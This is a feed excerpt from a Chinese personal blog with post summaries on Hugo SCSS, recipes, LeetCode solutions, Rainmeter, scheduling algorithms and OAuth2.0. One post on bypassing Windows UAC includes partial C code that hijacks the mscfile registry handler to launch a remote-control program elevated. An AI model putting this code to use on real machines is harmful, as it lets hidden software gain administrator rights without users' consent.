Sass（Syntatically Awesome Style Sheets）是一种CSS预处理器，它可以用来定义一套新的语法规则和函数，以加强和提升CSS。
举例来说，一个页面中可能需要用到许多次颜色#000，即白色；在原始的CSS代码中这个#000需要不断地出现在各个位置，如color: #000、background: #000等，这就为样式的改变带来了麻烦，假如我们需要整体性地改变页面颜色主题，就只能找到所有的#000并将其修改，实在不够方便。而Sass引入了变量，其概念和C/C++等语言中的变量并无二致，极大地简化了数值的维护。现在可以使用如下的写法来设置页面颜色：
$WHITE: #000; /* 设置变量 */ .code { background: $WHITE; } .header { color: $WHITE; } 然而，最初的Sass的语法规则和CSS有太多的出入，后来官方在2010年推出了一个全新的语法，叫做SCSS（Sassy CSS），试图弥合Sass和CSS之间的差别。现在我们看到的代码多数已经是SCSS，而其灵魂就是变量，如此理解便好。
 2. hugo和SCSS
 hugo支持SCSS，因此你所能见到的较为现代的主题多是使用SCSS来定义样式。
你的网站样式存放在根目录下asset/css文件夹中，不同的主题可能有不同的组织形式，其结构总体上类似于一个分工良好的C/Python程序——各个部位的样式分成各个独立的文件来进行定义，最终使用一个主文件将各个模块include/import进来，实现完整的页面样式。
我的KeepIt主题有一个内容如下的主文件，功能正如我所述：
main.scss
按照import的顺序，HTML文档中的各个标签、各个Class都被其相应的文件赋上了特定的样式，最终形成了一个和谐美观的主题。
如果你了解CSS，应该知道CSS中的“覆盖”原则，即对于同一个选择器，其后面的属性会覆盖先前出现的属性。比如对于名为str的类，我们的CSS文件中存在两种定义：
/* line 11 */ .str { color: #efefef; } ... /* line 20 */ .str { color: #ffdab9; } 那么，位于20行的定义会覆盖位于11行的定义，使得具有str类的标签内容呈现#ffdab9这种颜色。
这种覆盖原则就是我们自定义hugo样式的基础。
 3. 精确定义样式
 基于上面提到的覆盖原则，我们能够对指定的选择器进行多次的样式定义，而最终效果以最后一次定义为准，类似于变量的多次赋值。
在我所知道的hugo主题中，asset/css目录中都有_custom.scss文件，这个文件就是让用户自定义样式的地方。至于为什么可以用这个文件实现样式的自定义，我们可以重新看看main.scss的最后几行：</description>
    </item>
    
    <item>
      <title>食记 | 丝瓜炒鸭肉</title>
      <link>https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E4%B8%9D%E7%93%9C%E7%82%92%E9%B8%AD%E8%82%89/</link>
      <pubDate>Tue, 19 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E4%B8%9D%E7%93%9C%E7%82%92%E9%B8%AD%E8%82%89/</guid>
      <description>家常菜记录第二篇。
鸭肉又干又柴，丝瓜食之无味，两者结合倒是有不错的效果。
 食材
 瘦鸭肉切成片状（不在图中），大蒜少许，胡萝卜若干，丝瓜一盆。
食材
 制作流程
 1. 油炸鸭肉
 首先将鸭肉片裹上木薯粉（或者炸粉），不必太多，使得肉看起来仍是肉色，放置片刻； 锅底放入适量油； 放鸭肉，此时的油应该能够没过肉。油炸数分钟使鸭肉表面呈现深棕色，然后将鸭肉取出。 Step1 Step1.1  2. 加胡萝卜
 将刚才的油取出少许，使得剩余的油没过锅底即可； 放入蒜炒香，放入胡萝卜。 Step2  3. 加丝瓜
 将丝瓜倒入锅中，看似很多，之后炒制将会缩水。 Step3  4. 焖制
 加入适量水之后盖上锅盖焖制，其间适时开盖翻炒。 整个过程大约数分钟。  5. 加调味料，加鸭肉
 加入盐、糖、味精，翻炒均匀； Step4 加入之前炸制的鸭肉。翻炒均匀。 Step5  6. 出锅
 鸭肉本柴，裹粉油炸使得口感得到较好的改善；丝瓜无味，正适合解油除腻。 Final1 Final2  </description>
    </item>
    
    <item>
      <title>食记 | 荷兰豆炒腊肠</title>
      <link>https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E8%8D%B7%E5%85%B0%E8%B1%86%E7%82%92%E8%85%8A%E8%82%A0/</link>
      <pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E8%8D%B7%E5%85%B0%E8%B1%86%E7%82%92%E8%85%8A%E8%82%A0/</guid>
      <description>开启了新的分类——日常篇。
从知识分享到知识记录，最终此博客大概要变成无所不包的地方罢。
本文忠实地记录一道家常菜的做法：荷兰豆炒腊肠（名字我乱起的）。这道菜为荷兰豆附上了腊肠的香气，且不失其青翠本色，是我个人接受度较高的一种荷兰豆的做法。
 食材
 荷兰豆若干，大蒜少许，胡萝卜若干（点缀颜色），瘦肉若干，腊肠切片，火腿肠切片（可选）。
食材
 制作流程
 1. 热油，放蒜炒香
 这一步大概是家常菜中的起手式了。由于荷兰豆并不是特别吸油，加上腊肠本身在炒制的过程中会出油，这一步的油量放到盖过锅底即可。翻炒数下，香味顿起，不食蒜者可将蒜捡出。 Step1  2. 加胡萝卜
 个人觉得胡萝卜在这道菜中的作用就是点缀一点颜色，放或不放皆可。胡萝卜早放则出锅之后口感较为柔软，晚放则生脆，自行斟酌。 Step2  3. 加腊肠和瘦肉
 油香立变。 Step3  4. 加荷兰豆和火腿肠
 初加荷兰豆时，其表面暗淡；翻炒数下即青翠欲滴。可以在此步加入火腿肠，以此法做出的火腿肠别具风味。 Step4 Step5  5. 盖上锅盖焖制，加调味料
 盖上锅盖焖制数分钟，其间适时开盖翻炒，使油和菜混匀；适量加水以免出现焦味；数分钟后，加调味料（盐、味精、糖、酱油），翻炒均匀，可再焖制数十秒，随后出锅。 此步无图。  6. 成品
 此法做出的荷兰豆光泽明亮，入口有腊肠香味，细嚼则有清香，并不肥腻。 Final  </description>
    </item>
    
    <item>
      <title>错题本 | LeetCode1232. 缀点成线</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1232.-%E7%BC%80%E7%82%B9%E6%88%90%E7%BA%BF/</link>
      <pubDate>Sun, 17 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1232.-%E7%BC%80%E7%82%B9%E6%88%90%E7%BA%BF/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/check-if-it-is-a-straight-line/
题目 在一个 XY 坐标系中有一些点，我们用数组 coordinates 来分别记录它们的坐标，其中 coordinates[i] = [x, y] 表示横坐标为 x、纵坐标为 y 的点。
请你来判断，这些点是否在该坐标系中属于同一条直线上，是则返回 true，否则请返回 false。
分析 这种题目居然WA了一次。。。
依题意，判断给出的所有点是否都在同一直线上，我们只需要按照前两点的坐标计算斜率和截距，得到由前两点确定的直线方程，将后面的坐标套入此方程即可。
这题的特殊情况有两种：
 一共只给出两个点。两点确定一条直线，直接返回true。 所有点垂直于x轴。这样的直线没有斜率，需要单独拎出来讨论（第一次提交就挂在这里了）。  直接放代码了。
class Solution { public: bool checkStraightLine(vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt;&amp;amp; coordinates) { // ax1 + b = y1; ax2 + b = y2  // a(x1 - x2) = y1 - y2  // a = (y1 - y2) / (x1 - x2)  // b = y1 - ax1  if (coordinates.</description>
    </item>
    
    <item>
      <title>错题本 | LeetCode947. 移除最多的同行或同列石头</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode947.-%E7%A7%BB%E9%99%A4%E6%9C%80%E5%A4%9A%E7%9A%84%E5%90%8C%E8%A1%8C%E6%88%96%E5%90%8C%E5%88%97%E7%9F%B3%E5%A4%B4/</link>
      <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode947.-%E7%A7%BB%E9%99%A4%E6%9C%80%E5%A4%9A%E7%9A%84%E5%90%8C%E8%A1%8C%E6%88%96%E5%90%8C%E5%88%97%E7%9F%B3%E5%A4%B4/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/
题目 n 块石头放置在二维平面中的一些整数坐标点上。每个坐标点上最多只能有一块石头。
如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。
给你一个长度为 n 的数组 stones ，其中 stones[i] = [xi, yi] 表示第 i 块石头的位置，返回 可以移除的石子 的最大数量。
示例1
 输入： stones = [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]] 输出： 5 解释： 一种移除 5 块石头的方法如下所示：  移除石头 [2,2] ，因为它和 [2,1] 同行。 移除石头 [2,1] ，因为它和 [0,1] 同列。 移除石头 [1,2] ，因为它和 [1,0] 同行。 移除石头 [1,0] ，因为它和 [0,0] 同列。 移除石头 [0,1] ，因为它和 [0,0] 同行。 石头 [0,0] 不能移除，因为它没有与另一块石头同行/列。    分析 其实不知道这题该算错题还是难题，毕竟它的思路是简单的，但是我并没有想到。
暂且归为错题罢。借由此题捡回了并查集的相关知识，在实现并查集的过程中有一些细节上的错误导致了一次WA，本篇将加以记录。
分析：
 由题意可知，在同一行或同一列上的石头属于同一个集合。显然，这样的集合永远可以找到一个删除的顺序，使得集合中只剩下唯一一个石头。</description>
    </item>
    
    <item>
      <title>难题本 | LeetCode862. 和至少为 K 的最短子数组</title>
      <link>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode862.-%E5%92%8C%E8%87%B3%E5%B0%91%E4%B8%BA-k-%E7%9A%84%E6%9C%80%E7%9F%AD%E5%AD%90%E6%95%B0%E7%BB%84/</link>
      <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode862.-%E5%92%8C%E8%87%B3%E5%B0%91%E4%B8%BA-k-%E7%9A%84%E6%9C%80%E7%9F%AD%E5%AD%90%E6%95%B0%E7%BB%84/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/
这题的思路真是弯弯绕绕，看了很多份题解，最后还是我BUPT学长的一通模拟让我悟道了[1]。
分析：
 题目要求返回数组A的最短的非空连续子数组的长度，该子数组的和至少为K。
最开始想到的是暴力。假设数组长度为n，我们分别求出长度为1、2、&amp;hellip;、n的子数组的最大和，将他们按顺序和K比较，第一个比K大的长度就是答案。这样的做法时间复杂度是O(n2)，有点复杂。
之后就没有想法了。跟泓泓挣扎了半天，还是只能去看题解。
不得不说，官方题解真是不讲人话[2]，不到40行代码的思路，硬是能被说成鬼都看不懂的样子。
首先，为了方便求任意一段连续子数组的和，我们需要使用前缀和数组prefix_sum。在这个题目中，prefix_sum[i]表示的是从A[0]到A[i - 1]的前缀和，注意是A[i - 1]，作用后面会讲。总之，求前缀和的办法是很常规的。
我们知道，求得了前缀和数组之后，对于两个下标x、y（设y&amp;gt;x），prefix_sum[y] - prefix_sum[x]表示的就是从A[x + 1]到A[y]这段子数组的和。那么，问题就转化为了针对prefix_sum数组，求一对x和y，满足prefix_sum[y] - prefix_sum[x] &amp;gt;= K，且y - x最小。
朴素的思想是遍历每一对y和x，这样的复杂度还是O(n2)，显然需要用某种更巧妙的办法让我们摆脱两重循环。
于是引出官方题解中的第一条性质：
 对于prefix_sum数组，假设有下标**a &amp;gt; b**，且prefix_sum[a] &amp;lt;= prefix_sum[b]，那么对于它们后面的某个下标y来说，只需要考虑a ~ y这一段是否满足条件，而不再需要考虑b ~ y这一段了。这是因为，prefix_sum[y] - prefix_sum[a] &amp;gt;= prefix_sum[y] - prefix_sum[b]，而且y - a &amp;lt; y - b，如果b ~ y这一段能满足条件，那么a ~ y这一段也一定能满足条件，而且这段子数组的长度更小。  如果我没有讲清楚，不妨看看参考[1]中的模拟大法：
本条性质的模拟
我们使用一个双端队列deque来利用这个性质。让下标从前往后走，保持deque中保存的下标x0、x1、&amp;hellip;始终满足prefix_sum[x0] &amp;lt; prefix_sum[x1] &amp;lt; ...；注意，由于下标是从前往后走的，当出现了某个prefix_sum[x_m] &amp;lt; prefix_sum[deque.back()]的时候，说明对于之后的下标y来说，x_m是更为合适的选择，也因此可以直接将队尾的元素剔除。
使用下面的代码来进行实现，注意deque的初始元素0。
// deque&amp;lt;int&amp;gt; monoq;	// 变量名与官方题解保持一致 monoq.</description>
    </item>
    
    <item>
      <title>错题本 | LeetCode953. 验证外星语词典</title>
      <link>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode953.-%E9%AA%8C%E8%AF%81%E5%A4%96%E6%98%9F%E8%AF%AD%E8%AF%8D%E5%85%B8/</link>
      <pubDate>Tue, 12 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode953.-%E9%AA%8C%E8%AF%81%E5%A4%96%E6%98%9F%E8%AF%AD%E8%AF%8D%E5%85%B8/</guid>
      <description>题目链接：https://leetcode-cn.com/problems/verifying-an-alien-dictionary/
题目分析：由题目给定字符的大小等级，依照此等级比较字符串大小。
解题思路：定义一个数组order_rank[26]，给定某个字符c, order_rank[&#39;a&#39; - c]表示该字符在order中的位置。
错误记录：程序第32行，原本写作：while (words1[idx] == words2[idx])，这样的写法无法满足两个字符串相等的情况（即两个字符串每个字符都相等，包括最后的\0符号也相等，产生了溢出，理论上循环将在字符串后的某个位置上停止。
更正：循环中判断两个字符的终止，改为while (words1[idx] == words2[idx] &amp;amp;&amp;amp; words1[idx] != &#39;\0&#39; &amp;amp;&amp;amp; words2[idx] != &#39;\0&#39;)。
AC代码：
class Solution { public: int order_rank[26]; bool isAlienSorted(vector&amp;lt;string&amp;gt;&amp;amp; words, string order) { vector&amp;lt;string&amp;gt;::iterator ite; bool ret = true; set_rank(order); // 设置order_rank数组  for (ite = words.begin(); ite != words.end(); ++ite) // 两两对比  { if (ite != words.end() - 1) { if (cmp(*ite, *(ite + 1)) &amp;gt; 0) // cmp返回正数，前者比后者大  { ret = false; break; } } } return ret; } void set_rank(string order) { int idx = 0; for (idx = 0; idx &amp;lt; 26; ++idx) { order_rank[order[idx] - &amp;#39;a&amp;#39;] = idx; // 得到每个字母的顺序，rank越小，出现越早，等级越低  } } int cmp(string words1, string words2) { int idx = 0; while (words1[idx] == words2[idx] &amp;amp;&amp;amp; words1[idx] !</description>
    </item>
    
    <item>
      <title>提权技术--绕过UAC</title>
      <link>https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac/</link>
      <pubDate>Mon, 28 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-%E7%BB%95%E8%BF%87uac/</guid>
      <description>最近整理以前的项目，尝试在一个程序上实现进程隐藏和自动提权，结果进程隐藏花了很多时间，没得到一个理想的结果，自动提权倒是参考了几位大佬的文章做出来了。
话不多说，总结本次的提权办法——绕过UAC。
1 UAC  UAC（User　Account　Control）是Windows系统中的一项安全机制，它可以保证应用程序以非管理员的权限运行。UAC使得所有用户以标准用户权限登录，他们打开的进程（程序）也将以标准权限运行，一款良好的程序应该遵守这一安全规则。
然而，有些程序如历史遗留的程序，在当年设计阶段并没有很好地考虑到安全问题，它们通常会请求标准权限之外的权限，否则无法正常工作；此外，有些行为如下载应用、修改防火墙设置等都需要标准权限以外的权限来完成。
当一款应用需要请求标准权限以外的权限时，UAC会将此行为告知用户，这样使得用户对自己电脑上的任何提权行为了如指掌。
如果你是管理员用户，你可以在任意的程序上右键，选择“以管理员身份运行”，就能看到UAC的弹窗。
不难理解，通过这样的手段，可以有效地阻止恶意程序在电脑上的破坏行为，或者防止用户对某些系统设置的误更改。
 2 绕过UAC  根据参考文章［１］所述，	触发UAC时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo 的 RAiLuanchAdminProcess函数。流程如下：
 该函数首选验证路径是否在白名单中 接着将结果传递给consent.exe进程 该进程验证请求进程的签名以及发起者的权限是否符合要求后，决定是否弹出UAC窗口让用户确认 UAC窗口会创建新的安全桌面，屏蔽之前的界面，同时UAC窗口进程是系统权限进程，其他普通进程无法和其进行通信交互，用户确认后，调用CreateProcessAsUser函数以管理员身份启动请求的进程。  对于一些恶意程序而言，总是希望在用户不知情的情况下以管理员权限运行，这就需要我们绕过UAC弹窗。目前绕过UAC有两种思路：基于白名单和基于COM组件接口。
 2.1 基于白名单的Bypass　UAC  有些系统程序可以直接获取管理员权限，而不触发UAC弹框，这类程序称为白名单程序。例如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。
针对这些程序，可以使用DLL注入或修改注册表执行命令等方式启动目标程序，由于子进程默认继承父进程的权限，被这些白名单程序所打开的进程也就具备管理员权限了。
我事先准备了一个远程控制程序RemoteCtrl_Win10.exe，可以基于白名单机制，利用如下的代码尝试启动它：
#include &amp;lt;Windows.h&amp;gt; BOOL SetReg(char* lpszExePath) { HKEY hKey = NULL; // 创建项  ::RegCreateKeyEx(HKEY_CURRENT_USER, &amp;#34;Software\\Classes\\mscfile\\Shell\\Open\\Command&amp;#34;, 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;amp;hKey, NULL); // 设置键值  ::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)lpszExePath, (1 + ::lstrlen(lpszExePath))); // 关闭注册表  ::RegCloseKey(hKey); return TRUE; } int main() { BOOL bRet = FALSE; PVOID OldValue = NULL; // 关闭文件重定位  ::Wow64DisableWow64FsRedirection(&amp;amp;OldValue); // 修改注册表，设置我们的程序为启动目标  bRet = SetReg(&amp;#34;F:\\RemoteCtrl_Win10.</description>
    </item>
    
    <item>
      <title>桌面美化方案-Rainmeter</title>
      <link>https://xrg.fj.cn/p/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/</link>
      <pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/</guid>
      <description>谁能想到我在考试前一天还在写桌面美化的博客呢？
电脑桌面是每天开机后进入工作之前第一眼看到的东西，一个美观的桌面能从心情上给人以振奋。我在整机重装之后学习了一下如何美化桌面，现在我的Window10系统桌面长成这样：
桌面效果
1. rainmeter
 rainmeter实际上是一个系统状态监视软件，由于其强大的可定制性及扩展性，诸多使用者在原来的基础上开发了成百上千的插件程序和皮肤样式，使得现在的rainmeter几乎成为一款完美的系统美化工具。你可以从官网上下载它：
 Rainmeter, desktop customization tool
 下载安装完成之后，打开这个程序，自带一个简单的样式，使得你可以在桌面上看到CPU使用率、磁盘使用情况等等。
要达到美化的效果，仅仅使用自带的组件样式是不够的。我们需要从网络上寻找好看的rainmeter皮肤资源，这里首先给出官方的社区，本次桌面的效果就是使用社区中michaelpuerses大佬做的Sonder皮肤：
 Sonder - Rainmeter skin by michaelpurses on DeviantArt
 需要注意的是，访问此网站需要科学上网，且最好选择漂亮国的节点，并开启全局模式。如果你不会，我也不打算教你，你可以从很多其他地方找到皮肤资源（如GitHub、国内各论坛等等）。此外，下载皮肤时要求进行注册，亲测gamil有效。
rainmeter的皮肤有两种形式：
 .rmskin文件格式。这类文件直接双击打开，自动安装皮肤。 文件夹格式。这类皮肤需要手动放入你的rainmeter皮肤路径下，具体做法为：右键右下角的rainmeter小图标 &amp;ndash;&amp;gt; 皮肤 &amp;ndash;&amp;gt; 打开皮肤目录，将你下好（并解压）的文件夹放进去。  我在寻找皮肤的过程中，发现国内网站的相关内容真是少的可怜，找到一个论坛，下载皮肤的时候居然还要交钱买邀请码进行登录，属实有点离谱；百度rainmeter贴吧上面有些大佬的作品看着还可以，我没有试用过。
你还可以从知乎或者一些外文评测贴中找到很多好看的主题推荐，这里给出两个外文帖子，我的主题就是在第二篇文章的推荐下找到的：
 43 Best Rainmeter Skins For Windows in 2020
35 Spectacular Rainmeter Skins For Windows
 放张效果图吧，除了我现在使用的桌面外，rainmeter还能这样玩：
Enigma主题效果图
看完是不是很想开启自己的皮肤邂逅之旅了？
 2. TaskbarX
 实际上，我的桌面还有处地方值得注意：任务栏图标居中。看似细小处，实则是整个和谐的视觉体系中不可或缺的一部分。在很多Windows的美化教程中，都使用各式各样的软件来制作出类似MacOS的dock效果，而且实际上rainmeter也能制作dock效果，不过michaelpuerses大佬没有在我这款皮肤中实现dock。
就我个人而言，完全仿照MacOS进行美化实在是有点过头了。很多好看的主题，只需要将任务栏透明化、图标居中之后就会产生画龙点睛的效果。
于是引出我们要下载的第二款软件：TaskbarX。这款软件能使你的任务栏图标始终保持居中状态，其原理大概是每隔固定的时间进行检查与调整（我猜的）。链接如下：
 TaskbarX | Center taskbar icons (chrisandriessen.</description>
    </item>
    
    <item>
      <title>一些简单的进程调度算法</title>
      <link>https://xrg.fj.cn/p/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/</link>
      <pubDate>Mon, 19 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/</guid>
      <description>上一次挖的OAuth2.0坑还没填好，又要开一个操作系统的坑了&amp;hellip;
本篇介绍一些简单的进程调度算法，以及它们的代码实现。文章的具体组织为：一些关键概念的介绍 &amp;ndash;&amp;gt; 四种进程调度算法（SJF、FCFS、HRRF、HPF）。
话不多说，Let&amp;rsquo;s go！
一些概念  在对四种调度算法进行介绍之前，有一些概念希望读者能够理解：
 周转时间：进程完成时间 - 进程到达时间。也就是整个进程从开始到结束所花费的时间。 平均周转时间：这个数值一般用于衡量调度的效率。比如在一段时间内来了5个进程，那么在这段时间内这些进程的平均周转时间就是五个进程的周转时间之和 / 5。 带权周转时间：某个进程的带权周转时间就是这个进程的周转时间 / 运行时间。由于系统中总有多个进程在运行，周转时间往往大于运行时间。因此，带权周转时间一般大于等于1。 平均带权周转时间：多个进程带权周转时间的平均值。  实际上，还有很多指标可以来衡量调度算法的优劣，如CPU利用率、系统吞吐量、响应时间等等。但是本文中介绍的调度算法与时间紧密相连，故此只需要理解以上几个概念，就能够看懂下文对于调度算法的分析。
 先来先服务算法（First Come First Serve，FCFS）  先来先服务算法简直是不怎么需要介绍的了。顾名思义，该算法使得CPU优先服务最先到达的进程。生活中充满着先来先服务算法：超市排队、食堂取餐等等。下面用一个例子来模拟这个算法：
假设有五个进程，它们的到达时间和希望的运行时间如下：
进程描述
本着先来先服务的原则，我们在第0秒的时间为进程1服务；在第4秒的时间服务结束，此时进程2、3、5都已到达，但是进程5是最先到的，因而进程5优先受到服务；在第6秒的时间进程5服务结束，此时在等候的进程还有进程2和进程3，为进程3服务，在第16秒的时间服务结束，此时还有进程2和进程4（在第7秒的时候到的），为进程2服务，在第22秒的时候结束进程2，服务进程4，最终在第34秒结束进程4。
CPU对这五个进程的服务次序如下图所示：
服务次序
如果你还记得第一小节所讲的内容，我们不妨算一下在这个例子中这几个概念分别是多少：
统计时间
你看出其中存在的问题了吗？
 短作业优先算法（Shortest Job First，SJF）  先来先服务算法很好理解、在生活中很常见，但是它存在一个问题：对于一些运行时间很短的进程，光是在那边排队等待所花费的时间可能数倍于真正的运行时间！
在上一个例子中，进程2所花费的运行时间只有6秒，但是它很不幸地被进程3抢占先机，只能眼睁睁看着进程3运行了10秒。光是等待的时间就比运行的时间还多！因此，它的带权周转时间也是最大的，现在是否对这个概念的理解深刻了许多？
先来先服务的死板特性对于某些短作业来说简直是灾难，此时，短作业优先算法就显得友好许多。
短作业优先算法不关注进程的到达时间，当CPU结束了一个进程的服务之后，永远从等待的所有进程中找出运行时间最短的进程为其服务。
还是上面的例子，在第0秒的时间为进程1服务，在第4秒的时间进程2、3、5都已到达，此时进程5需要的时间最少，因此它优先受到服务；在第6秒的时间进程5的服务结束了，此时在等候的进程还有2和3，虽然进程3是先到的，但是进程2所需要的时间更少，因此进程2优先受到服务；在第12秒的时候进程2的服务结束了，此时在等候的进程还有3和4，优先为进程3服务，在第22秒的时候为进程4服务，在第34秒的时候结束。
这个例子中，我们的进程2比进程3更晚到达，但是由于它所需要的时间更短，就得到了优先的服务。这就是短作业优先的思想。
如果你没有第一时间看出这个算法的问题，那么请考虑下面这个例子：
新例子
在这里，我们只是把进程4的运行时间由12秒调整为8秒，其他的没有变化。
但是此时，我们在第12秒的时候结束了进程2的服务，此时在等候的还有进程3和进程4，我们优先服务进程4，在第20秒的时候结束它，服务进程3，在第30秒的时候进程3结束。
把数据完善一下，就会发现问题所在：
新数据
可怜的进程3，在第2秒到达，在第30秒结束，周转时间高达28秒！
这就是短作业优先的问题——当系统中不断地有短作业到来的时候，很早就在那里等待的长作业就无法得到服务，最终出现进程饥饿。
 最高响应比优先算法（Highest Response Ratio First，HRRF）  在短作业优先算法中，进程饥饿是一个比较致命的问题。但是短作业优先的思想确实是有相当的可取之处的，于是人们考虑保留这种思想，同时使得长进程能够较少地受到饥饿，这就有了最高响应比优先算法。</description>
    </item>
    
    <item>
      <title>OAuth2.0浅析</title>
      <link>https://xrg.fj.cn/p/oauth2.0%E6%B5%85%E6%9E%90/</link>
      <pubDate>Mon, 12 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/oauth2.0%E6%B5%85%E6%9E%90/</guid>
      <description>本文将介绍开放授权协议的概念，OAuth协议解决的问题以及OAuth协议的设计方案与应用情况。
1. 背景  在生活中，我们接触的各种网络服务通常需要使用我们的个人资源。例如，我们使用网易云音乐，但是选择QQ登录，这时网易云需要获取我们的QQ账号信息，如果双方之间没有一个有效的授权机制，就会对我们的隐私安全造成威胁。试想：网易云音乐如何获取我们的QQ账号信息呢？无非是让我们给出我们的账号密码吧。但是这样做有如下严重的缺点：
 我们需要把QQ账号密码告诉网易云音乐，增加了泄露的风险； 网易云音乐拥有了对你的QQ账号的操作权限——想想都头皮发麻； 需要收回网易云音乐对QQ的访问权限时，只能通过修改密码的方式，但是这样做会使其他使用同样方式访问QQ的应用全部失效。  基于此，开放授权（Open Authorization）希望能够使得第三方无需知道用户的账号及密码，就可以获取用户的授权信息。
如果是你，你会怎么实现它？
 2. 设计方案  OAuth2.0主要涉及四种角色，分别是：
 用户，即资源所有者。 资源服务器，即服务提供商。用来存放受保护的用户资源。在上面的例子中，资源服务器就是QQ服务器。 客户端，向资源服务器进行资源请求的第三方应用程序。在上面的例子中，客户端就是网易云音乐服务器。 认证服务器，在验证资源所有者并取得所有者的授权后，将访问令牌发给客户端。当我们想使用QQ登录网易云音乐，首先就是要证明我们的号主身份，这就是认证服务器的工作——证明身份、取得授权、允许第三方访问。  显然，资源服务和认证服务的提供者都是QQ，因此它们可以运行在同一台服务器上。
OAuth2.0 就是在这四个角色的基础上，设计了四种授权模式：授权码（Authorization Code）模式、简化模式、密码模式和客户端模式。下面就重点一起看一下授权码模式的工作流程。
 3. 授权码模式  授权码是认证服务器提供的一串序列，客户端可以凭借授权码向认证服务器索要访问令牌（Access Token），进而实现相应资源的访问。没看懂？举个例子——
 还是使用QQ授权登录网易云音乐，我们需要经历如下的流程：
 打开网易云音乐，点击“使用QQ登录”； 网易云音乐跟我们说：想使用QQ登录？行，但是我现在没有访问QQ账号的权限，给你张纸条，上面写了我要访问你账号哪些信息，你去找QQ让他同意我访问； 于是我们来到QQ认证界面。QQ首先要我们登录账号，然后跟我们说：网易云音乐想要你的昵称信息、头像信息等等等等，你同意不？ 我们选择同意。于是QQ给了我们一张纸条，跟我们说：这个纸条上写了访问你昵称头像信息的授权码，你拿去给网易云音乐，他拿着这个条子来找我，我就让他访问； 于是我们把写着授权码的条子给了网易云音乐，他拿着这个条子去找QQ了，QQ的认证服务器根据这张条子给网易云音乐开出了一个访问令牌（Access Token），网易云拿到了这张令牌，并凭借它成功访问了我们的QQ账号信息。 网易云音乐拿到这个账号信息，在自己数据库里面一查，发现这个QQ账号已经跟某个网易云音乐账号绑定了，于是我们成功使用自己的QQ账号登录了网易云音乐。   这就是非常具象的授权码模式，是不是非常简单？
但是，这里还有一些细节需要思考：
 QQ会说，我这么没牌面的吗？谁想从我这请求资源我就给他？ 在上面的例子中，我们从网易云音乐去找QQ，拿到授权码之后回去找网易云音乐。但是，在真实的浏览器和Web服务器交互的过程中，我们的浏览器可没这么聪明，我们要给它规划好路线才行。  针对第一个问题，OAuth2.0给足了资源服务器面子，它要求：所有的客户端都要在资源服务器那边进行事先的注册，否则直接不给予访问的权限。也就是说，网易云音乐事先已经跟QQ说好了，每次要访问QQ账号信息的时候都会带上身份证明，以表明这是网易云音乐要来访问QQ的资源了。客户端在资源提供方注册的时候，会拿到资源提供方给出的一个client_id和client_secret，之后就用这两个东西表明身份。
而针对第二个问题，我们在向QQ请求授权码的时候，需要提供redirect_uri（或callback_uri）字段，表明浏览器拿到授权码之后要交给谁。于是，授权码模式的完整交互流程如下：
授权码工作模式
 4. 简化模式  看完授权码模式，如果你觉得这个流程有点繁琐，那么简化模式可能会让你快乐一些：
简化模式
在这个模式中，少掉了授权码的传递，直接传递访问令牌，所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。
这样的模式对一些纯前端的网络服务比较友好，因为它不需要资源请求者与资源提供者进行认证交互，直接拿着访问令牌找上门就好了。
